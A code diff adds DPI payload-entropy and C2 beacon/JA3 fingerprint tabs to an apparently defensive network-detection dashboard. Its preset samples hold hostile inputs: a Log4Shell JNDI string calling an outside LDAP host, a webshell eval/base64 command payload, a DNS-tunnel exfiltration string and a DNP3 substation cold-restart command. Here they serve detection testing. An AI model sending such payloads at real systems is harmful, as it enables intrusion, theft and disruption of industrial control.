@@ -7,7 +7,8 @@ import {
   RefreshCw, Cpu, HardDrive, Database, Globe, Layers, Eye, FileText, Code, 
   Upload, Sliders, Zap, Server, Lock, Unlock, Radio, Crosshair, AlertCircle,
   FileCode, ExternalLink, HelpCircle, Bookmark, Sparkles, Check, X, Copy,
-  Wifi, BarChart2, TrendingUp, Info, FileSpreadsheet, Flame
+  Wifi, BarChart2, TrendingUp, Info, FileSpreadsheet, Flame,
+  Bug, Fingerprint, Waves, Key
 } from 'lucide-react';
 import NDRTrafficHeatmap24h from './NDRTrafficHeatmap24h';
 import { 
@@ -414,7 +415,7 @@ export default function TrafficAnalysisNDRView() {
   const isZh = i18n.language?.startsWith('zh') || i18n.language === 'zh';
 
   // Navigation Subtabs
-  const [activeTab, setActiveTab] = useState<'forensics' | 'suricata' | 'topology' | 'bandwidth' | 'heatmap' | 'replay'>('forensics');
+  const [activeTab, setActiveTab] = useState<'forensics' | 'suricata' | 'topology' | 'heatmap' | 'bandwidth' | 'dpi' | 'c2_beacon' | 'replay'>('forensics');
   
   // Forensics states
   const [pcapFilterQuery, setPcapFilterQuery] = useState('');
@@ -436,6 +437,19 @@ export default function TrafficAnalysisNDRView() {
   const [isSyncingRules, setIsSyncingRules] = useState<boolean>(false);
   const [isRefreshing, setIsRefreshing] = useState<boolean>(false);
 
+  // Advanced NDR Engine state (DPI, C2 Beacon Jitter, JA3 Database)
+  const [dpiPayloadInput, setDpiPayloadInput] = useState<string>('GET /login HTTP/1.1 User-Agent: ${jndi:ldap://185.220.101.45:1389/Exploit} Host: srv-app-01.corp:8080');
+  const [dpiProtocolInput, setDpiProtocolInput] = useState<string>('HTTP');
+  const [dpiSrcIpInput, setDpiSrcIpInput] = useState<string>('185.220.101.45');
+  const [dpiDstIpInput, setDpiDstIpInput] = useState<string>('10.88.88.201');
+  const [dpiSrcPortInput, setDpiSrcPortInput] = useState<string>('48920');
+  const [dpiDstPortInput, setDpiDstPortInput] = useState<string>('8080');
+  const [dpiAnalysisResult, setDpiAnalysisResult] = useState<any>(null);
+  const [isAnalyzingDpi, setIsAnalyzingDpi] = useState<boolean>(false);
+
+  const [beaconData, setBeaconData] = useState<any>(null);
+  const [ja3Catalog, setJa3Catalog] = useState<any[]>([]);
+
   // Selected Session for Hex Inspect Modal
   const [selectedSessionForModal, setSelectedSessionForModal] = useState<TrafficSession | null>(null);
 
@@ -454,13 +468,15 @@ export default function TrafficAnalysisNDRView() {
   // Real-time backend data polling & synchronization
   const fetchAllNdrData = async () => {
     try {
-      const [telemetryRes, sessionsRes, alertsRes, rulesRes, bandwidthRes, talkersRes] = await Promise.allSettled([
+      const [telemetryRes, sessionsRes, alertsRes, rulesRes, bandwidthRes, talkersRes, beaconRes, ja3Res] = await Promise.allSettled([
         fetch('/api/v1/ndr/telemetry').then(r => r.ok ? r.json() : null),
         fetch('/api/v1/ndr/sessions').then(r => r.ok ? r.json() : null),
         fetch('/api/v1/ndr/suricata/alerts').then(r => r.ok ? r.json() : null),
         fetch('/api/v1/ndr/suricata/rules-status').then(r => r.ok ? r.json() : null),
         fetch('/api/v1/ndr/bandwidth/trends').then(r => r.ok ? r.json() : null),
-        fetch('/api/v1/ndr/top-talkers').then(r => r.ok ? r.json() : null)
+        fetch('/api/v1/ndr/top-talkers').then(r => r.ok ? r.json() : null),
+        fetch('/api/v1/ndr/c2/beacon-analysis').then(r => r.ok ? r.json() : null),
+        fetch('/api/v1/ndr/ja3/fingerprints').then(r => r.ok ? r.json() : null)
       ]);
 
       if (telemetryRes.status === 'fulfilled' && telemetryRes.value?.success) {
@@ -485,8 +501,44 @@ export default function TrafficAnalysisNDRView() {
         if (talkersRes.value.topTalkers) setTopTalkers(talkersRes.value.topTalkers);
         if (talkersRes.value.topDestinations) setTopDestinations(talkersRes.value.topDestinations);
       }
+      if (beaconRes.status === 'fulfilled' && beaconRes.value?.success) {
+        setBeaconData(beaconRes.value);
+      }
+      if (ja3Res.status === 'fulfilled' && ja3Res.value?.success && Array.isArray(ja3Res.value.signatures)) {
+        setJa3Catalog(ja3Res.value.signatures);
+      }
     } catch (err) {
       console.warn('NDR data fetch error:', err);
+    }
+  };
+
+  // Run deep DPI analysis against backend endpoint
+  const handleAnalyzeDpi = async () => {
+    setIsAnalyzingDpi(true);
+    try {
+      const res = await fetch('/api/v1/ndr/dpi/analyze-payload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          rawPayload: dpiPayloadInput,
+          protocol: dpiProtocolInput,
+          srcIp: dpiSrcIpInput,
+          dstIp: dpiDstIpInput,
+          srcPort: Number(dpiSrcPortInput),
+          dstPort: Number(dpiDstPortInput)
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        setDpiAnalysisResult(data.analysis);
+        showToast(isZh ? 'DPI 封包香農熵值與特徵碼分析完成！' : 'DPI analysis completed.');
+      } else {
+        showToast(isZh ? 'DPI 解析失敗' : 'DPI analysis failed');
+      }
+    } catch (err) {
+      showToast(isZh ? '連線分析端點錯誤' : 'Network error during DPI analysis');
+    } finally {
+      setIsAnalyzingDpi(false);
     }
   };
 
@@ -894,6 +946,8 @@ export default function TrafficAnalysisNDRView() {
           {[
             { id: 'forensics', label: isZh ? '🔬 封包鑑識與 PCAP 串流' : 'PCAP Forensics', icon: FileCode },
             { id: 'suricata', label: isZh ? '🛡️ Suricata IDS & 威脅檢測' : 'Suricata IDS & Zeek', icon: Shield },
+            { id: 'dpi', label: isZh ? '⚡ DPI 深層負載與香農熵分析' : 'DPI & Payload Entropy', icon: Bug },
+            { id: 'c2_beacon', label: isZh ? '📡 C2 信標週期與 JA3 指紋庫' : 'C2 Jitter & JA3 TLS', icon: Fingerprint },
             { id: 'topology', label: isZh ? '🌐 即時連線流量拓撲' : 'Traffic Topology', icon: Network },
             { id: 'heatmap', label: isZh ? '🔥 24H 流量熱力圖 (D3.js)' : '24h D3 Heatmap', icon: Flame },
             { id: 'bandwidth', label: isZh ? '📈 頻寬趨勢與 Top Talkers' : 'Bandwidth & Top Talkers', icon: BarChart2 },
@@ -1562,6 +1616,351 @@ export default function TrafficAnalysisNDRView() {
                           className="px-2.5 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white rounded-lg text-[10px] font-bold transition-all border border-gray-700"
                         >
                           {isZh ? '規則微調' : 'Tune Rule'}
+                        </button>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* SUBTAB: ⚡ DPI 深層負載與香農熵分析 (DPI ANALYSIS STUDIO) */}
+      {activeTab === 'dpi' && (
+        <div className="space-y-6">
+          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-6 shadow-2xl space-y-6">
+            <div className="flex flex-wrap items-center justify-between gap-4 border-b border-gray-800 pb-4">
+              <div>
+                <h3 className="text-sm font-black uppercase tracking-wider text-white flex items-center gap-2">
+                  <Bug className="w-4 h-4 text-purple-400" />
+                  {isZh ? 'NDR 深度封包檢測 (DPI) 與香農資訊熵分析控制台' : 'Deep Packet Inspection & Shannon Entropy Console'}
+                </h3>
+                <p className="text-xs text-gray-500 mt-1">
+                  {isZh ? '向後端 /api/v1/ndr/dpi/analyze-payload 即時發起十六進位或明文 Payload 深度取證，計算香農熵值以偵測穿透加密隧道' : 'Analyze payloads with entropy and signature inspection'}
+                </p>
+              </div>
+
+              {/* Template quick loader */}
+              <div className="flex items-center gap-2">
+                <span className="text-xs text-gray-400 font-bold">{isZh ? '載入預設樣本：' : 'Preset:'}</span>
+                <select
+                  onChange={(e) => {
+                    const val = e.target.value;
+                    if (val === 'log4j') {
+                      setDpiPayloadInput('GET /login HTTP/1.1 User-Agent: ${jndi:ldap://185.220.101.45:1389/Exploit} Host: srv-app-01.corp:8080');
+                      setDpiProtocolInput('HTTP');
+                      setDpiSrcIpInput('185.220.101.45');
+                      setDpiDstIpInput('10.88.88.201');
+                      setDpiDstPortInput('8080');
+                    } else if (val === 'godzilla') {
+                      setDpiPayloadInput('POST /uploads/shell.jsp HTTP/1.1 pass=secret eval(base64_decode("c3lzdGVtKCRfUE9TVFsndycndSk7")); whoami');
+                      setDpiProtocolInput('HTTP');
+                      setDpiSrcIpInput('185.220.101.45');
+                      setDpiDstIpInput('10.88.88.201');
+                      setDpiDstPortInput('80');
+                    } else if (val === 'dns_tunnel') {
+                      setDpiPayloadInput('TXT dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls_chunk992182018a.tunnel.ns.org');
+                      setDpiProtocolInput('DNS');
+                      setDpiSrcIpInput('10.88.88.102');
+                      setDpiDstIpInput('8.8.8.8');
+                      setDpiDstPortInput('53');
+                    } else if (val === 'dnp3') {
+                      setDpiPayloadInput('DNP3 Function 0x0D Cold Restart target_rtu=0x0001 controller=Turbine-Substation');
+                      setDpiProtocolInput('DNP3');
+                      setDpiSrcIpInput('10.88.88.106');
+                      setDpiDstIpInput('192.168.100.99');
+                      setDpiDstPortInput('20000');
+                    }
+                  }}
+                  className="bg-black/50 border border-gray-800 rounded-xl px-3 py-1.5 text-xs text-white focus:outline-none focus:border-purple-500 font-bold"
+                >
+                  <option value="">{isZh ? '-- 選擇測試封包負載 --' : '-- Select Sample --'}</option>
+                  <option value="log4j">Log4Shell JNDI 注入 (CVE-2021-44228)</option>
+                  <option value="godzilla">哥斯拉 Godzilla AES 加密 WebShell</option>
+                  <option value="dns_tunnel">DNS 隱蔽穿透高熵外洩隧道</option>
+                  <option value="dnp3">工控 DNP3 變電所冷重啟 (Cold Restart)</option>
+                </select>
+              </div>
+            </div>
+
+            {/* Inputs */}
+            <div className="grid grid-cols-2 md:grid-cols-5 gap-3 text-xs">
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '協定' : 'Protocol'}</label>
+                <input 
+                  type="text" 
+                  value={dpiProtocolInput} 
+                  onChange={(e) => setDpiProtocolInput(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono"
+                />
+              </div>
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '來源 IP' : 'Src IP'}</label>
+                <input 
+                  type="text" 
+                  value={dpiSrcIpInput} 
+                  onChange={(e) => setDpiSrcIpInput(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono"
+                />
+              </div>
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '目的 IP' : 'Dst IP'}</label>
+                <input 
+                  type="text" 
+                  value={dpiDstIpInput} 
+                  onChange={(e) => setDpiDstIpInput(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono"
+                />
+              </div>
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '來源 Port' : 'Src Port'}</label>
+                <input 
+                  type="text" 
+                  value={dpiSrcPortInput} 
+                  onChange={(e) => setDpiSrcPortInput(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono"
+                />
+              </div>
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '目的 Port' : 'Dst Port'}</label>
+                <input 
+                  type="text" 
+                  value={dpiDstPortInput} 
+                  onChange={(e) => setDpiDstPortInput(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono"
+                />
+              </div>
+            </div>
+
+            {/* Payload textarea */}
+            <div className="space-y-2">
+              <div className="flex justify-between items-center text-xs">
+                <span className="font-bold text-gray-300">{isZh ? '封包負載 Raw Payload / Hex Dump：' : 'Raw Payload:'}</span>
+                <span className="text-[10px] text-gray-500 font-mono">{dpiPayloadInput.length} chars</span>
+              </div>
+              <textarea
+                rows={4}
+                value={dpiPayloadInput}
+                onChange={(e) => setDpiPayloadInput(e.target.value)}
+                placeholder="貼上欲取證之網路串流字串或十六進位 Hex..."
+                className="w-full bg-black/60 border border-gray-800 rounded-2xl p-4 font-mono text-xs text-gray-200 focus:outline-none focus:border-purple-500 leading-relaxed custom-scrollbar shadow-inner"
+              />
+            </div>
+
+            {/* Action buttons */}
+            <div className="flex justify-end gap-3">
+              <button
+                onClick={() => {
+                  setDpiPayloadInput('');
+                  setDpiAnalysisResult(null);
+                }}
+                className="px-4 py-2 bg-gray-900 hover:bg-gray-800 text-gray-400 hover:text-white rounded-xl text-xs font-bold transition-all border border-gray-800"
+              >
+                {isZh ? '清空' : 'Clear'}
+              </button>
+              <button
+                disabled={isAnalyzingDpi || !dpiPayloadInput.trim()}
+                onClick={handleAnalyzeDpi}
+                className="px-6 py-2.5 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 disabled:opacity-40 text-white rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-2 shadow-lg shadow-purple-600/30"
+              >
+                <Sparkles size={14} className={isAnalyzingDpi ? "animate-spin" : ""} />
+                <span>{isAnalyzingDpi ? (isZh ? 'DPI 運算中...' : 'Analyzing...') : (isZh ? '啟動後端 DPI 與香農熵分析' : 'Run DPI Analysis')}</span>
+              </button>
+            </div>
+
+            {/* Analysis Result Display */}
+            {dpiAnalysisResult && (
+              <div className="bg-[#0c0c0f] border border-gray-800 rounded-2xl p-5 space-y-4 animate-fadeIn">
+                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-gray-800/80 pb-3">
+                  <div className="flex items-center gap-3">
+                    <span className={cn(
+                      "px-2.5 py-1 rounded-xl text-xs font-bold uppercase",
+                      dpiAnalysisResult.isHighEntropy ? "bg-red-500/20 text-red-400 border border-red-500/40" : "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
+                    )}>
+                      {dpiAnalysisResult.isHighEntropy ? '高熵加密/隧道' : '正常文本負載'}
+                    </span>
+                    <span className="text-xs font-mono text-gray-400">{dpiAnalysisResult.endpoints}</span>
+                  </div>
+
+                  {/* Shannon Entropy Meter */}
+                  <div className="flex items-center gap-2 font-mono text-xs">
+                    <span className="text-gray-400 font-bold">Shannon Entropy:</span>
+                    <strong className={cn(
+                      "text-sm px-2 py-0.5 rounded border",
+                      dpiAnalysisResult.shannonEntropy > 4.5 ? "text-red-400 bg-red-950/40 border-red-500/40" : "text-emerald-400 bg-emerald-950/40 border-emerald-500/40"
+                    )}>
+                      {dpiAnalysisResult.shannonEntropy} / 8.0
+                    </strong>
+                  </div>
+                </div>
+
+                {/* Anomalies Alert Box */}
+                {dpiAnalysisResult.anomalies && dpiAnalysisResult.anomalies.length > 0 && (
+                  <div className="p-3 bg-red-950/25 border border-red-500/40 rounded-xl space-y-1 text-xs">
+                    <span className="font-bold text-red-300 flex items-center gap-1.5">
+                      <AlertTriangle size={14} className="text-red-400" />
+                      {isZh ? '檢測到深層協定負載異常：' : 'Protocol Anomalies:'}
+                    </span>
+                    <ul className="list-disc list-inside text-red-200/90 space-y-0.5 pl-1">
+                      {dpiAnalysisResult.anomalies.map((ano: string, aidx: number) => (
+                        <li key={aidx}>{ano}</li>
+                      ))}
+                    </ul>
+                  </div>
+                )}
+
+                {/* Matched Signature Details if any */}
+                {dpiAnalysisResult.signatureMatch && (
+                  <div className="p-4 bg-purple-950/20 border border-purple-500/40 rounded-2xl space-y-2 text-xs">
+                    <div className="flex justify-between items-center">
+                      <span className="px-2 py-0.5 bg-purple-500/30 text-purple-300 font-mono font-bold rounded">
+                        {dpiAnalysisResult.signatureMatch.signatureId}
+                      </span>
+                      <span className="text-red-400 font-bold font-mono">
+                        Risk {dpiAnalysisResult.signatureMatch.riskScore} • Confidence {dpiAnalysisResult.signatureMatch.confidence}%
+                      </span>
+                    </div>
+                    <h4 className="text-sm font-bold text-white">{dpiAnalysisResult.signatureMatch.signatureName}</h4>
+                    <p className="text-gray-300">{dpiAnalysisResult.signatureMatch.summary}</p>
+                    <div className="pt-2 border-t border-purple-500/20 flex flex-wrap gap-2 text-[10px] font-mono text-purple-300">
+                      <span>MITRE: {dpiAnalysisResult.signatureMatch.mitreTTP}</span>
+                      <span>• Tactic: {dpiAnalysisResult.signatureMatch.mitreTactic}</span>
+                      {dpiAnalysisResult.signatureMatch.cve && <span>• CVE: {dpiAnalysisResult.signatureMatch.cve}</span>}
+                    </div>
+                  </div>
+                )}
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* SUBTAB: 📡 C2 信標週期與 JA3 指紋庫 (C2 JITTER & JA3 TLS ENGINE) */}
+      {activeTab === 'c2_beacon' && (
+        <div className="space-y-6">
+          {/* Top: C2 Periodic Beaconing Candidates */}
+          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-6 shadow-2xl space-y-4">
+            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
+              <div>
+                <h3 className="text-sm font-black uppercase tracking-wider text-white flex items-center gap-2">
+                  <Fingerprint className="w-4 h-4 text-rose-400" />
+                  {isZh ? 'C2 逆向信標週期與 Sleep Jitter 抖動分析引擎' : 'C2 Reverse Beaconing & Sleep Jitter Analysis'}
+                </h3>
+                <p className="text-xs text-gray-500 mt-1">
+                  {isZh ? '基於傅立葉轉換與封包抵達間隔變異數統計，即時挖掘具備規律特徵的隱匿 C2 通道' : 'Inter-packet arrival time variance clustering'}
+                </p>
+              </div>
+              <span className="text-xs font-mono px-3 py-1 bg-rose-500/10 border border-rose-500/30 text-rose-400 rounded-xl font-bold">
+                {beaconData?.confirmedBeaconsCount || 2} {isZh ? '條已確認 C2 通道' : 'Confirmed C2 Channels'}
+              </span>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+              {(beaconData?.beaconCandidates || []).map((b: any, bidx: number) => (
+                <div key={bidx} className="bg-[#09090b] border border-gray-800 rounded-2xl p-4 space-y-3">
+                  <div className="flex justify-between items-start">
+                    <span className={cn(
+                      "text-[10px] font-black uppercase px-2 py-0.5 rounded",
+                      b.verdict.includes('CONFIRMED') ? "bg-rose-950 text-rose-300 border border-rose-800" : "bg-amber-950 text-amber-300 border border-amber-800"
+                    )}>
+                      {b.verdict}
+                    </span>
+                    <span className="text-xs font-bold text-gray-400 font-mono">{b.status}</span>
+                  </div>
+
+                  <div>
+                    <h4 className="text-xs font-bold text-white font-mono truncate">{b.channel}</h4>
+                    <p className="text-[11px] text-gray-400 mt-0.5">{b.threatActor}</p>
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-2 text-[10px] font-mono bg-black/40 p-2.5 rounded-xl border border-gray-800/80">
+                    <div>
+                      <span className="text-gray-500 block">信標週期:</span>
+                      <strong className="text-white">{b.observedIntervalSec}s</strong>
+                    </div>
+                    <div>
+                      <span className="text-gray-500 block">Jitter 抖動率:</span>
+                      <strong className="text-amber-400">{b.jitterPct}%</strong>
+                    </div>
+                    <div>
+                      <span className="text-gray-500 block">信賴指標:</span>
+                      <strong className="text-emerald-400">{b.confidencePct}%</strong>
+                    </div>
+                    <div>
+                      <span className="text-gray-500 block">TLS JA3:</span>
+                      <strong className="text-purple-400 truncate block">{b.ja3 ? b.ja3.slice(0, 8) + '...' : 'N/A'}</strong>
+                    </div>
+                  </div>
+
+                  <button
+                    onClick={() => handleBlockIp(b.dstIp, `C2 Beacon 阻斷: ${b.threatActor}`)}
+                    className="w-full py-1.5 bg-rose-600/20 hover:bg-rose-600 text-rose-300 hover:text-white rounded-xl text-xs font-bold transition-all border border-rose-500/30 flex items-center justify-center gap-1.5"
+                  >
+                    <Shield size={12} />
+                    <span>{isZh ? '聯防阻斷此 C2' : 'Block C2 Target'}</span>
+                  </button>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Bottom: TLS JA3 / JA3S Passive Fingerprints Catalog */}
+          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-6 shadow-2xl space-y-4">
+            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
+              <div>
+                <h3 className="text-sm font-black uppercase tracking-wider text-white flex items-center gap-2">
+                  <Key className="w-4 h-4 text-blue-400" />
+                  {isZh ? 'TLS 被動握手 JA3 / JA3S 黑名單特徵庫' : 'TLS JA3 / JA3S Fingerprint Database'}
+                </h3>
+                <p className="text-xs text-gray-500 mt-1">
+                  {isZh ? '辨識 ClientHello 加密協商簽章，精準抓出 Cobalt Strike、Meterpreter 與惡意木馬 TLS 偽裝' : 'Passive TLS ClientHello fingerprinting'}
+                </p>
+              </div>
+              <span className="text-xs font-mono text-gray-400 font-bold">
+                {ja3Catalog.length} {isZh ? '筆特徵碼' : 'Signatures'}
+              </span>
+            </div>
+
+            <div className="overflow-x-auto custom-scrollbar">
+              <table className="w-full text-left font-mono text-xs">
+                <thead>
+                  <tr className="border-b border-gray-800 text-[10px] text-gray-500 uppercase">
+                    <th className="py-2.5 px-3">JA3 Hash</th>
+                    <th className="py-2.5 px-3">{isZh ? '工具 / 威脅標籤' : 'Tool / Threat'}</th>
+                    <th className="py-2.5 px-3">{isZh ? '分類' : 'Category'}</th>
+                    <th className="py-2.5 px-3">{isZh ? '風險等級' : 'Risk'}</th>
+                    <th className="py-2.5 px-3">{isZh ? '歷史命中數' : 'Hits'}</th>
+                    <th className="py-2.5 px-3 text-right">{isZh ? '操作' : 'Action'}</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-gray-800/60">
+                  {ja3Catalog.map((ja3, jidx) => (
+                    <tr key={jidx} className="hover:bg-white/5 transition-colors">
+                      <td className="py-3 px-3 text-blue-400 font-bold">{ja3.hash}</td>
+                      <td className="py-3 px-3 font-sans font-bold text-white">{ja3.tool}</td>
+                      <td className="py-3 px-3 text-gray-400">{ja3.category}</td>
+                      <td className="py-3 px-3">
+                        <span className={cn(
+                          "px-2 py-0.5 rounded text-[10px] font-black uppercase",
+                          ja3.risk === 'Critical' ? "bg-rose-950 text-rose-300 border border-rose-800" :
+                          ja3.risk === 'High' ? "bg-orange-950 text-orange-300 border border-orange-800" : "bg-emerald-950 text-emerald-300"
+                        )}>
+                          {ja3.risk}
+                        </span>
+                      </td>
+                      <td className="py-3 px-3 text-gray-300 font-bold">{ja3.matchCount?.toLocaleString()}</td>
+                      <td className="py-3 px-3 text-right">
+                        <button
+                          onClick={() => {
+                            setPcapFilterQuery(ja3.hash);
+                            setActiveTab('forensics');
+                            showToast(isZh ? `已依據 JA3 ${ja3.hash.slice(0, 8)}... 篩選會話串流！` : 'Filtered sessions by JA3');
+                          }}
+                          className="px-2.5 py-1 bg-blue-600/20 hover:bg-blue-600 text-blue-300 hover:text-white rounded-lg text-[10px] font-bold transition-all border border-blue-500/30"
+                        >
+                          {isZh ? '篩選連線' : 'Filter Sessions'}
                         </button>
                       </td>
                     </tr>
